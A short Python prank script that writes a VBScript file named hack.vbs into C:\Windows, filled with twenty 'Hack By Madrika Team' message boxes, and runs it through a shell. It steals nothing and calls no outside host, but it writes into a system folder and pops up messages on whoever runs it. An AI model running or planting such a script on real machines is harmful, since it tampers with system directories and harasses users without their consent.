from subprocess import check_output as cmd

#This is Fuction for Show MSG BOX
def show_msg():
    Warning = """
    MsgBox ("Hack By Madrika Team")
    """
    f = open("C:\\Windows\\hack.vbs","w")
    for i in range(20):
        f.writelines(Warning)
    f.close()
    cmd("C:\\Windows\\hack.vbs",shell=True)

show_msg()       